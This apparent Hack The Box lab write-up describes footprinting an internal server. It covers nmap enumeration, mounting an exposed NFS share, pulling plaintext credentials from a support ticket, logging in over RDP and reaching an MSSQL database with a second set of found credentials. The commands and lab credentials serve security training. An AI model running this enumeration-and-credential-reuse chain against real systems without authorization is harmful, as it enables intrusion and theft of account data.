# Footprinting – Medium Lab

## Engagement Overview
Target: Internal shared server accessible by all employees.  
Customer created user *HTB* for proof of exploitation.  

---

## Objectives
- Enumerate the server.
- Obtain HTB’s password.

---

## Service Enumeration
**Nmap Scan**
```bash
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nlockmgr
3389/tcp open  ms-wbt-server (RDP)
```

---

## Initial Access
**NFS**
```bash
showmount -e 10.129.157.85
Export list:
/TechSupport (everyone)

sudo mount -t nfs 10.129.157.85:/ ./tech -o nolock
```

Credentials found inside support ticket:
```text
user: alex
pass: lol123!mD
```

**Access via RDP**
```bash
xfreerdp3 /u:alex /p:'lol123!mD' /v:10.129.157.85
```

---

## Escalation
- MS SQL Server present on desktop.
- Attempted logins failed until additional credentials were found in Alex’s files:
  - `sa:87N1ns@slls83`

**Database contained user/password data (including HTB).**

---

## Tools Utilized
- `nmap`
- `showmount`, `mount`
- `xfreerdp`
- MSSQL client

---

## Key Takeaways
- NFS shares exposed sensitive internal credentials.
- Password reuse allowed immediate lateral RDP access.
- Administrator password stored insecurely in plaintext.
- Database access yielded final proof-of-concept compromise.